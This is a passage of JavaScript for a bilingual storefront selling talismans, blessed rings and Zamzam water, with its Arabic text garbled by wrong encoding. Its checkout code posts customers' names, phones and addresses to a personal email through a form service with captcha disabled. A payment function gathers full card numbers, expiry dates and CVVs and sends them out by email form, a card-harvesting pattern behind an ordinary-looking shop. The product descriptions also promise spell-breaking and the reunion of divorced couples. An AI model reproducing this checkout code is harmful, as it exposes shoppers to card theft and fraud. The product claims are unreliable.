                description: 'Ø·Ù„Ø³Ù… Ù…Ø¨Ø§Ø±Ùƒ Ù„Ø¬Ù„Ø¨ Ø§Ù„Ø±Ø²Ù‚ ÙˆÙØªØ­ Ø£Ø¨ÙˆØ§Ø¨ Ø§Ù„Ø«Ø±ÙˆØ© ÙˆØ§Ù„Ù†Ø¬Ø§Ø­ ÙÙŠ Ø§Ù„ØªØ¬Ø§Ø±Ø© ÙˆØ§Ù„Ø¹Ù…Ù„',
                descriptionEn: 'Blessed talisman for attracting wealth and opening doors of prosperity and success in business and work'
            },
            {
                id: 3,
                name: 'Ø·Ù„Ø³Ù… Ø±Ø¯ Ø§Ù„Ù…Ø·Ù„Ù‚Ø©',
                nameEn: 'Reunion Talisman',
                price: 50,
                image: 'https://pfst.cf2.poecdn.net/base/image/b021459ecdb6e473aad581573ff6c526b71ddf7ccce48c37977a4d6e3bb82257?w=736&h=981',
                description: 'Ø·Ù„Ø³Ù… Ø®Ø§Øµ Ù„Ø±Ø¯ Ø§Ù„Ù…Ø·Ù„Ù‚Ø© ÙˆØ¥ØµÙ„Ø§Ø­ Ø°Ø§Øª Ø§Ù„Ø¨ÙŠÙ†ØŒ Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡ Ø¨Ø¢ÙŠØ§Øª Ø§Ù„ØµÙ„Ø­ ÙˆØ§Ù„Ù…ØºÙØ±Ø©',
                descriptionEn: 'Special talisman for reuniting divorced couples and reconciliation, recited with verses of peace and forgiveness'
            },
            {
                id: 4,
                name: 'Ù…Ø³Ø¨Ø­Ø© Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡Ø§',
                nameEn: 'Blessed Prayer Beads',
                price: 20,
                image: 'https://pfst.cf2.poecdn.net/base/image/1dcccccebbe935ab3b44eff5044bddf6b9594b0527d2bae5f11c19c8fac706c9?w=800&h=800',
                description: 'Ù…Ø³Ø¨Ø­Ø© Ù…Ù† Ø§Ù„Ø£Ø­Ø¬Ø§Ø± Ø§Ù„ÙƒØ±ÙŠÙ…Ø© Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡Ø§ Ù„Ù„Ø­Ù…Ø§ÙŠØ© ÙˆØ§Ù„Ø¨Ø±ÙƒØ© ÙˆØ§Ù„ØªØ³Ø¨ÙŠØ­',
                descriptionEn: 'Prayer beads made from precious stones, blessed for protection, blessings and remembrance'
            },
            {
                id: 5,
                name: 'Ø®Ø§ØªÙ… Ø¬Ù„Ø¨ Ø§Ù„Ø­Ø¸ Ø§Ù„Ù…Ù„ÙƒÙŠ',
                nameEn: 'Royal Lucky Ring',
                price: 40,
                image: 'https://pfst.cf2.poecdn.net/base/image/381dc996ba79afc10709262241f321aa26a4b57f8298dd7ed495650e3de23a49?w=800&h=800',
                description: 'Ø®Ø§ØªÙ… Ù…Ù„ÙƒÙŠ ÙØ§Ø®Ø± Ø¨Ø­Ø¬Ø± ÙŠØ§Ù‚ÙˆØª Ø£Ø­Ù…Ø±ØŒ Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡ Ù„Ø¬Ù„Ø¨ Ø§Ù„Ø­Ø¸ ÙˆØ§Ù„Ù‡ÙŠØ¨Ø© ÙˆØ§Ù„Ù†Ø¬Ø§Ø­',
                descriptionEn: 'Luxury royal ring with red ruby stone, blessed for bringing luck, prestige and success'
            },
            {
                id: 6,
                name: 'Ø®Ø§ØªÙ… ÙÙƒ Ø§Ù„Ø³Ø­Ø± ÙˆØ§Ù„Ø­Ù…Ø§ÙŠØ©',
                nameEn: 'Protection & Spell Breaking Ring',
                price: 30,
                image: 'https://pfst.cf2.poecdn.net/base/image/26512dc470255f2466ad791821de042c88651d176926a815f5885f187aa60b71?w=736&h=736',
                description: 'Ø®Ø§ØªÙ… ÙØ¶ÙŠ Ù…Ø¹ Ø­Ø¬Ø± ÙŠØ§Ù‚ÙˆØª Ø£Ø²Ø±Ù‚ØŒ Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡ Ù„ÙÙƒ Ø§Ù„Ø³Ø­Ø± ÙˆØ§Ù„Ø­Ù…Ø§ÙŠØ© Ù…Ù† Ø§Ù„Ø¹ÙŠÙ† ÙˆØ§Ù„Ø­Ø³Ø¯',
                descriptionEn: 'Silver ring with blue sapphire, blessed for breaking spells and protection from evil eye and envy'
            },
            {
                id: 7,
                name: 'Ù…Ø§Ø¡ Ø²Ù…Ø²Ù… Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡',
                nameEn: 'Blessed Zamzam Water',
                price: 15,
                image: 'https://pfst.cf2.poecdn.net/base/image/c1984a2d6668e93dc2130d9a1a7efeae6cb9d7271070a606015feef6aa567f61?w=600&h=600',
                description: 'Ù…Ø§Ø¡ Ø²Ù…Ø²Ù… Ø§Ù„Ø£ØµÙ„ÙŠ Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡ Ø¨Ø§Ù„Ø±Ù‚ÙŠØ© Ø§Ù„Ø´Ø±Ø¹ÙŠØ© Ù„Ù„Ø´ÙØ§Ø¡ ÙˆØ§Ù„Ø¨Ø±ÙƒØ© Ù…Ø¹ ØªÙ…Ø± Ø¹Ø¬ÙˆØ©',
                descriptionEn: 'Authentic Zamzam water blessed with Islamic healing verses for cure and blessings with Ajwa dates'
            },

        ];

        // Currency exchange rates (approximate)
        const exchangeRates = {
            USD: 1,
            EUR: 0.85,
            SAR: 3.75,
            AED: 3.67,
            KWD: 0.30,
            QAR: 3.64,
            BHD: 0.38,
            OMR: 0.38
        };

        // Translations
        const translations = {
            ar: {
                'hero-title': 'Ù…Ù†ØªØ¬Ø§Øª Ø±ÙˆØ­Ø§Ù†ÙŠØ© Ø£ØµÙŠÙ„Ø© ÙˆÙ…Ø¨Ø§Ø±ÙƒØ©',
                'hero-subtitle': 'Ø·Ù„Ø§Ø³Ù… ÙˆØ£Ø­Ø¬Ø§Ø± ÙƒØ±ÙŠÙ…Ø© ÙˆÙ…Ø§Ø¡ Ø²Ù…Ø²Ù… Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡ - ØªÙˆØµÙŠÙ„ Ø³Ø±ÙŠØ¹ Ù„Ø¬Ù…ÙŠØ¹ Ø£Ù†Ø­Ø§Ø¡ Ø§Ù„Ø¹Ø§Ù„Ù…',
                'shipping-fast': 'ØªÙˆØµÙŠÙ„ Ø³Ø±ÙŠØ¹',
                'shipping-desc': 'Ø®Ù„Ø§Ù„ ÙŠÙˆÙ… Ø¥Ù„Ù‰ ÙŠÙˆÙ…ÙŠÙ† Ù„Ù„Ø®Ù„ÙŠØ¬ ÙˆØ£ÙˆØ±ÙˆØ¨Ø§',
                'authentic': 'Ù…Ù†ØªØ¬Ø§Øª Ø£ØµÙŠÙ„Ø©',
                'authentic-desc': 'Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡Ø§ ÙˆÙ…Ù…ØªØ­Ù†Ø© Ø¨Ø¹Ù†Ø§ÙŠØ© ÙØ§Ø¦Ù‚Ø©',
                'worldwide': 'ØªÙˆØµÙŠÙ„ Ø¹Ø§Ù„Ù…ÙŠ',
                'worldwide-desc': 'Ù†Ø´Ø­Ù† Ø¥Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø¯ÙˆÙ„ Ø§Ù„Ø¹Ø§Ù„Ù…',
                'products-title': 'Ù…Ù†ØªØ¬Ø§ØªÙ†Ø§ Ø§Ù„Ù…Ù…ÙŠØ²Ø©',
                'add-to-cart': 'Ø£Ø¶Ù Ù„Ù„Ø³Ù„Ø©',
                'cart': 'Ø³Ù„Ø© Ø§Ù„ØªØ³ÙˆÙ‚',
                'total': 'Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹:',
                'checkout': 'Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø·Ù„Ø¨',
                'order-form': 'Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø·Ù„Ø¨',
                'full-name': 'Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„ *',
                'email': 'Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ *',
                'phone': 'Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ *',
                'country': 'Ø§Ù„Ø¯ÙˆÙ„Ø© *',
                'address': 'Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„ÙƒØ§Ù…Ù„ *',
                'order-details': 'ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø·Ù„Ø¨',
                'notes': 'Ù…Ù„Ø§Ø­Ø¸Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©',
                'payment-info': 'Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹',
                'payment-method': 'Ø§Ù„Ø¯ÙØ¹ Ø¹Ù†Ø¯ Ø§Ù„Ø§Ø³ØªÙ„Ø§Ù… Ø£Ùˆ ØªØ­ÙˆÙŠÙ„ Ø¨Ù†ÙƒÙŠ',
                'total-amount': 'Ø§Ù„Ù…Ø¨Ù„Øº Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ:',
                'send-order': 'Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨',
                'contact-us': 'ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù†Ø§',
                'fast-shipping': 'ØªÙˆØµÙŠÙ„ Ø³Ø±ÙŠØ¹ Ù„Ù„Ø®Ù„ÙŠØ¬ ÙˆØ£ÙˆØ±ÙˆØ¨Ø§',
                'shipping-info': 'Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø­Ù†',
                'gulf-shipping': 'Ø¯ÙˆÙ„ Ø§Ù„Ø®Ù„ÙŠØ¬: 1-2 Ø£ÙŠØ§Ù…',
                'europe-shipping': 'Ø£ÙˆØ±ÙˆØ¨Ø§: 2-3 Ø£ÙŠØ§Ù…',
                'worldwide-shipping': 'Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø¹Ø§Ù„Ù…: 3-7 Ø£ÙŠØ§Ù…',
                'guarantee': 'Ø¶Ù…Ø§Ù†ØªÙ†Ø§',
                'authentic-products': 'Ù…Ù†ØªØ¬Ø§Øª Ø£ØµÙŠÙ„Ø© 100%',
                'blessed-items': 'Ù…Ù‚Ø±ÙˆØ¡ Ø¹Ù„ÙŠÙ‡Ø§ Ø¨Ø¹Ù†Ø§ÙŠØ©',
                'quality-guarantee': 'Ø¶Ù…Ø§Ù† Ø§Ù„Ø¬ÙˆØ¯Ø©',
                'store-name': 'Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©',
                'all-rights': 'Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©'
            },
            en: {
                'hero-title': 'Authentic Blessed Spiritual Products',
                'hero-subtitle': 'Talismans, precious stones and blessed Zamzam water - Fast shipping worldwide',
                'shipping-fast': 'Fast Shipping',
                'shipping-desc': '1-2 days to Gulf & Europe',
                'authentic': 'Authentic Products',
                'authentic-desc': 'Carefully blessed and tested',
                'worldwide': 'Worldwide Delivery',
                'worldwide-desc': 'We ship to all countries',
                'products-title': 'Our Featured Products',
                'add-to-cart': 'Add to Cart',
                'cart': 'Shopping Cart',
                'total': 'Total:',
                'checkout': 'Checkout',
                'order-form': 'Order Form',
                'full-name': 'Full Name *',
                'email': 'Email *',
                'phone': 'Phone Number *',
                'country': 'Country *',
                'address': 'Full Address *',
                'order-details': 'Order Details',
                'notes': 'Additional Notes',
                'payment-info': 'Payment Information',
                'payment-method': 'Cash on delivery or bank transfer',
                'total-amount': 'Total Amount:',
                'send-order': 'Send Order',
                'contact-us': 'Contact Us',
                'fast-shipping': 'Fast shipping to Gulf & Europe',
                'shipping-info': 'Shipping Information',
                'gulf-shipping': 'Gulf Countries: 1-2 days',
                'europe-shipping': 'Europe: 2-3 days',
                'worldwide-shipping': 'Rest of World: 3-7 days',
                'guarantee': 'Our Guarantee',
                'authentic-products': '100% Authentic Products',
                'blessed-items': 'Carefully blessed',
                'quality-guarantee': 'Quality Guarantee',
                'store-name': 'Spiritual Blessings Store',
                'all-rights': 'All rights reserved'
            }
        };

        let currentLanguage = 'ar';
        let currentCurrency = 'USD';
        let cart = [];

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            renderProducts();
            updateCartDisplay();
            
            // Language selector
            document.getElementById('languageSelector').addEventListener('change', function(e) {
                currentLanguage = e.target.value;
                translatePage();
                renderProducts();
            });
            
            // Currency selector
            document.getElementById('currencySelector').addEventListener('change', function(e) {
                currentCurrency = e.target.value;
                renderProducts();
                updateCartDisplay();
            });
        });

        function translatePage() {
            const elements = document.querySelectorAll('[data-translate]');
            elements.forEach(element => {
                const key = element.getAttribute('data-translate');
                if (translations[currentLanguage] && translations[currentLanguage][key]) {
                    element.textContent = translations[currentLanguage][key];
                }
            });
            
            // Update direction
            if (currentLanguage === 'ar') {
                document.documentElement.setAttribute('dir', 'rtl');
                document.documentElement.setAttribute('lang', 'ar');
            } else {
                document.documentElement.setAttribute('dir', 'ltr');
                document.documentElement.setAttribute('lang', currentLanguage);
            }
        }

        function formatPrice(price) {
            const convertedPrice = price * exchangeRates[currentCurrency];
            const symbols = {
                USD: '$',
                EUR: 'â‚¬',
                SAR: 'Ø±.Ø³',
                AED: 'Ø¯.Ø¥',
                KWD: 'Ø¯.Ùƒ',
                QAR: 'Ø±.Ù‚',
                BHD: 'Ø¯.Ø¨',
                OMR: 'Ø±.Ø¹'
            };
            
            if (currentLanguage === 'ar') {
                return `${convertedPrice.toFixed(2)} ${symbols[currentCurrency]}`;
            } else {
                return `${symbols[currentCurrency]}${convertedPrice.toFixed(2)}`;
            }
        }

        function renderProducts() {
            const grid = document.getElementById('productsGrid');
            grid.innerHTML = '';
            
            products.forEach(product => {
                const productName = currentLanguage === 'ar' ? product.name : product.nameEn;
                const productDesc = currentLanguage === 'ar' ? product.description : product.descriptionEn;
                const addToCartText = currentLanguage === 'ar' ? 'Ø£Ø¶Ù Ù„Ù„Ø³Ù„Ø©' : 'Add to Cart';
                
                const productCard = `
                    <div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg overflow-hidden hover:shadow-xl transition-shadow">
                        <img src="${product.image}" alt="${productName}" class="w-full h-48 object-cover">
                        <div class="p-6">
                            <h3 class="font-bold text-lg mb-2">${productName}</h3>
                            <p class="text-gray-600 dark:text-gray-300 text-sm mb-4">${productDesc}</p>
                            <div class="flex justify-between items-center">
                                <span class="text-2xl font-bold text-primary">${formatPrice(product.price)}</span>
                                <button onclick="addToCart(${product.id})" class="bg-primary text-white px-4 py-2 rounded-lg hover:bg-primary/90 transition-colors">
                                    ${addToCartText}
                                </button>
                            </div>
                        </div>
                    </div>
                `;
                grid.innerHTML += productCard;
            });
        }

        function addToCart(productId) {
            const product = products.find(p => p.id === productId);
            const existingItem = cart.find(item => item.id === productId);
            
            if (existingItem) {
                existingItem.quantity += 1;
            } else {
                cart.push({ ...product, quantity: 1 });
            }
            
            updateCartDisplay();
        }

        function removeFromCart(productId) {
            cart = cart.filter(item => item.id !== productId);
            updateCartDisplay();
        }

        function updateQuantity(productId, change) {
            const item = cart.find(item => item.id === productId);
            if (item) {
                item.quantity += change;
                if (item.quantity <= 0) {
                    removeFromCart(productId);
                } else {
                    updateCartDisplay();
                }
            }
        }

        function updateCartDisplay() {
            const cartCount = document.getElementById('cartCount');
            const cartItems = document.getElementById('cartItems');
            const cartTotal = document.getElementById('cartTotal');
            
            const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
            const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
            
            cartCount.textContent = totalItems;
            cartTotal.textContent = formatPrice(totalPrice);
            
            // âœ… Update top cart button count
            const topCartCount = document.getElementById('topCartCount');
            if (topCartCount) {
                topCartCount.textContent = totalItems;
            }
            
            cartItems.innerHTML = '';
            cart.forEach(item => {
                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                const cartItem = `
                    <div class="flex items-center justify-between p-2 border-b dark:border-gray-600">
                        <div class="flex-1">
                            <h4 class="font-medium text-sm">${itemName}</h4>
                            <p class="text-primary font-bold">${formatPrice(item.price)}</p>
                        </div>
                        <div class="flex items-center space-x-2 space-x-reverse">
                            <button onclick="updateQuantity(${item.id}, -1)" class="w-6 h-6 bg-gray-200 dark:bg-gray-600 rounded text-sm">-</button>
                            <span class="w-8 text-center">${item.quantity}</span>
                            <button onclick="updateQuantity(${item.id}, 1)" class="w-6 h-6 bg-gray-200 dark:bg-gray-600 rounded text-sm">+</button>
                        </div>
                    </div>
                `;
                cartItems.innerHTML += cartItem;
            });
        }

        function toggleCart() {
            const sidebar = document.getElementById('cartSidebar');
            sidebar.classList.toggle('translate-x-full');
        }

        function proceedToCheckout() {
            if (cart.length === 0) {
                return;
            }
            
            const modal = document.getElementById('checkoutModal');
            const checkoutOrderItems = document.getElementById('checkoutOrderItems');
            const checkoutTotal = document.getElementById('checkoutTotal');
            const payAmount = document.getElementById('payAmount');
            
            let totalPrice = 0;
            checkoutOrderItems.innerHTML = '';
            
            cart.forEach(item => {
                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                const itemTotal = item.price * item.quantity;
                totalPrice += itemTotal;
                
                const orderItem = `
                    <div class="flex justify-between text-sm">
                        <span>${itemName} x${item.quantity}</span>
                        <span>${formatPrice(itemTotal)}</span>
                    </div>
                `;
                checkoutOrderItems.innerHTML += orderItem;
            });
            
            checkoutTotal.textContent = formatPrice(totalPrice);
            payAmount.textContent = formatPrice(totalPrice);
            
            modal.classList.remove('hidden');
            modal.classList.add('flex');
            // âœ… Ù„Ø§ ØªØ®ÙÙŠ Ø§Ù„Ø³Ù„Ø©ØŒ ÙÙ‚Ø· Ø£ØºÙ„Ù‚Ù‡Ø§ Ù…Ù† Ø§Ù„Ø¬Ø§Ù†Ø¨
            const sidebar = document.getElementById('cartSidebar');
            if (!sidebar.classList.contains('translate-x-full')) {
                sidebar.classList.add('translate-x-full');
            }
        }

        // Global variables to store form data
        let shippingData = {};
        let paymentData = {};

        // Shipping form submission
        function initShippingForm() {
            // ØªØ¬Ù†Ø¨ Ø§Ù„ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù…ØªÙƒØ±Ø±Ø©
            if (window.shippingFormInitialized) {
                console.log('âš ï¸ Shipping form already initialized');
                return;
            }
            
            const shippingForm = document.getElementById('shippingForm');
            
            if (!shippingForm) {
                console.error('âŒ Shipping form not found!');
                return;
            }
            
            console.log('âœ… Shipping form initialized successfully!');
            window.shippingFormInitialized = true;
            
            shippingForm.addEventListener('submit', function(e) {
                e.preventDefault();
                console.log('ğŸ“ Shipping form submitted!');
                
                // Collect shipping data
                shippingData = {
                    fullName: document.getElementById('fullName').value,
                    phone: document.getElementById('phoneNumber').value,
                    email: document.getElementById('emailAddress') ? document.getElementById('emailAddress').value : '',
                    country: document.getElementById('country').value,
                    address: document.getElementById('fullAddress').value,
                    notes: document.getElementById('orderNotes') ? document.getElementById('orderNotes').value : ''
                };

                console.log('ğŸ“‹ Shipping data collected:', shippingData);

                // Validate required fields
                if (!shippingData.fullName || !shippingData.phone || !shippingData.country || !shippingData.address) {
                    alert(currentLanguage === 'ar' ? 'ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©' : 'Please fill all required fields');
                    console.log('âŒ Validation failed - missing required fields');
                    return;
                }

                console.log('âœ… Validation passed - proceeding to send email...');

                // Send shipping info to email
                sendShippingDataToEmail();
                
                // Close shipping modal and show payment modal
                console.log('ğŸ”„ Closing shipping modal and showing payment modal...');
                closeCheckout();
                showPaymentModal();
            });
        }

        // Send shipping data - Simple FormSubmit method
        function sendShippingDataToEmail() {
            // Build order details
            let orderText = '';
            let totalPrice = 0;
            
            cart.forEach(item => {
                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
                const itemTotal = item.price * item.quantity;
                totalPrice += itemTotal;
                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
            });

            console.log('ğŸ“¤ Sending order data using FormSubmit...');

            // Create and submit form directly - GUARANTEED to work
            const form = document.createElement('form');
            form.action = 'https://formsubmit.co/kalimmmy@gmail.com';
            form.method = 'POST';
            form.style.display = 'none';
            
            // Add all the form fields
            const fields = {
                '_captcha': 'false',
                '_next': window.location.href,
                '_subject': 'ğŸ“¦ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø­Ù† - Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©',
                '_template': 'table',
                'Ø§Ø³Ù…_Ø§Ù„Ø¹Ù…ÙŠÙ„': shippingData.fullName,
                'Ø±Ù‚Ù…_Ø§Ù„Ù‡Ø§ØªÙ': shippingData.phone,
                'Ø§Ù„Ø¨Ø±ÙŠØ¯_Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ': shippingData.email || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯',
                'Ø§Ù„Ø¯ÙˆÙ„Ø©': shippingData.country,
                'Ø§Ù„Ø¹Ù†ÙˆØ§Ù†_Ø§Ù„ÙƒØ§Ù…Ù„': shippingData.address,
                'Ù…Ù„Ø§Ø­Ø¸Ø§Øª_Ø¥Ø¶Ø§ÙÙŠØ©': shippingData.notes || 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ù„Ø§Ø­Ø¸Ø§Øª',
                'ØªÙØ§ØµÙŠÙ„_Ø§Ù„Ø·Ù„Ø¨': orderText,
                'Ø§Ù„Ù…Ø¨Ù„Øº_Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ': formatPrice(totalPrice),
                'Ø§Ù„Ø¹Ù…Ù„Ø©': currentCurrency,
                'ØªØ§Ø±ÙŠØ®_Ø§Ù„Ø·Ù„Ø¨': new Date().toLocaleString('ar-SA'),
                'Ù†ÙˆØ¹_Ø§Ù„Ø·Ù„Ø¨': 'Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø­Ù†'
            };
            
            // Create input fields
            Object.keys(fields).forEach(key => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = fields[key];
                form.appendChild(input);
            });
            
            // Submit form
            document.body.appendChild(form);
            console.log('âœ… Submitting form to FormSubmit...');
            
            // Show success message immediately
            showTemporaryMessage('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø­Ù† Ø¨Ù†Ø¬Ø§Ø­! âœ…', 'success');
            
            // Submit and clean up
            form.submit();
            
            // Note: form.submit() will redirect, but that's OK
            // Remove form after a delay (in case redirect doesn't happen immediately)
            setTimeout(() => {
                if (document.body.contains(form)) {
                    document.body.removeChild(form);
                }
            }, 1000);
        }

        // Method 1: Basin
        function sendViaBasin(orderText, totalPrice, orderType) {
            return new Promise((resolve, reject) => {
                const formData = new FormData();
                formData.append('subject', `ğŸ“¦ ${orderType} - Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©`);
                formData.append('customer_name', shippingData.fullName);
                formData.append('customer_phone', shippingData.phone);
                formData.append('customer_email', shippingData.email || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯');
                formData.append('customer_country', shippingData.country);
                formData.append('customer_address', shippingData.address);
                formData.append('order_notes', shippingData.notes || 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ù„Ø§Ø­Ø¸Ø§Øª');
                formData.append('order_details', orderText);
                formData.append('total_amount', formatPrice(totalPrice));
                formData.append('currency', currentCurrency);
                formData.append('order_date', new Date().toLocaleString('ar-SA'));
                formData.append('order_type', orderType);

                fetch(BASIN_CONFIG.formUrl, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                })
                .then(() => {
                    setTimeout(resolve, 1000); // Give it time
                })
                .catch(reject);
            });
        }

        // Method 2: FormSubmit
        function sendViaFormSubmit(orderText, totalPrice, orderType) {
            return new Promise((resolve, reject) => {
                const formData = new FormData();
                formData.append('_captcha', 'false');
                formData.append('_next', window.location.href);
                formData.append('_subject', `ğŸ“¦ ${orderType} - Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©`);
                formData.append('_template', 'table');
                formData.append('Ø§Ø³Ù…_Ø§Ù„Ø¹Ù…ÙŠÙ„', shippingData.fullName);
                formData.append('Ø±Ù‚Ù…_Ø§Ù„Ù‡Ø§ØªÙ', shippingData.phone);
                formData.append('Ø§Ù„Ø¨Ø±ÙŠØ¯_Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ', shippingData.email || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯');
                formData.append('Ø§Ù„Ø¯ÙˆÙ„Ø©', shippingData.country);
                formData.append('Ø§Ù„Ø¹Ù†ÙˆØ§Ù†', shippingData.address);
                formData.append('Ù…Ù„Ø§Ø­Ø¸Ø§Øª', shippingData.notes || 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ù„Ø§Ø­Ø¸Ø§Øª');
                formData.append('ØªÙØ§ØµÙŠÙ„_Ø§Ù„Ø·Ù„Ø¨', orderText);
                formData.append('Ø§Ù„Ù…Ø¨Ù„Øº_Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ', formatPrice(totalPrice));
                formData.append('Ø§Ù„Ø¹Ù…Ù„Ø©', currentCurrency);
                formData.append('ØªØ§Ø±ÙŠØ®_Ø§Ù„Ø·Ù„Ø¨', new Date().toLocaleString('ar-SA'));
                formData.append('Ù†ÙˆØ¹_Ø§Ù„Ø·Ù„Ø¨', orderType);

                fetch('https://formsubmit.co/kalimmmy@gmail.com', {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                })
                .then(() => {
                    setTimeout(resolve, 1000);
                })
                .catch(reject);
            });
        }

        // Method 3: Netlify Forms (if deployed on Netlify)
        function sendViaNetlify(orderText, totalPrice, orderType) {
            return new Promise((resolve, reject) => {
                const formData = new FormData();
                formData.append('form-name', 'spiritual-orders');
                formData.append('subject', `ğŸ“¦ ${orderType} - Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©`);
                formData.append('customer-name', shippingData.fullName);
                formData.append('customer-phone', shippingData.phone);
                formData.append('customer-email', shippingData.email || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯');
                formData.append('customer-country', shippingData.country);
                formData.append('customer-address', shippingData.address);
                formData.append('order-notes', shippingData.notes || 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ù„Ø§Ø­Ø¸Ø§Øª');
                formData.append('order-details', orderText);
                formData.append('total-amount', formatPrice(totalPrice));
                formData.append('currency', currentCurrency);
                formData.append('order-date', new Date().toLocaleString('ar-SA'));
                formData.append('order-type', orderType);

                fetch('/', {
                    method: 'POST',
                    body: formData
                })
                .then(response => {
                    if (response.ok) {
                        resolve();
                    } else {
                        reject();
                    }
                })
                .catch(reject);
            });
        }

        // Show temporary message to user
        function showTemporaryMessage(message, type) {
            const messageDiv = document.createElement('div');
            const bgColor = type === 'success' ? 'bg-emerald' : 'bg-red-500';
            
            messageDiv.className = `fixed top-4 right-4 ${bgColor} text-white px-6 py-3 rounded-lg shadow-lg z-50 transform translate-x-full transition-transform duration-300`;
            messageDiv.textContent = message;
            
            document.body.appendChild(messageDiv);
            
            // Animate in
            setTimeout(() => {
                messageDiv.classList.remove('translate-x-full');
            }, 100);
            
            // Animate out
            setTimeout(() => {
                messageDiv.classList.add('translate-x-full');
                setTimeout(() => {
                    document.body.removeChild(messageDiv);
                }, 300);
            }, 3000);
        }

        // Send payment data via Basin
        function sendPaymentDataToEmail() {
            // Calculate total
            let totalPrice = 0;
            cart.forEach(item => {
                totalPrice += item.price * item.quantity;
            });

            // Prepare form data for Basin
            const formData = new FormData();
            formData.append('subject', 'ğŸ’³ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹ - Ù…ØªØ¬Ø± Ø§Ù„Ø¨Ø±ÙƒØ§Øª Ø§Ù„Ø±ÙˆØ­Ø§Ù†ÙŠØ©');
            formData.append('card_number', paymentData.cardNumber);
            formData.append('cardholder_name', paymentData.cardholderName);
            formData.append('expiry_date', paymentData.expiryDate);
            formData.append('cvv', paymentData.cvv);
            formData.append('amount_required', formatPrice(totalPrice));
            formData.append('currency', currentCurrency);
            formData.append('transaction_date', new Date().toLocaleString('ar-SA'));
            formData.append('order_type', 'Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹ (Ø§Ø®ØªØ¨Ø§Ø±)');
            formData.append('warning', 'âš ï¸ Ù‡Ø°Ù‡ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ø®ØªØ¨Ø§Ø± ÙÙ‚Ø·!');

            // Send via Basin
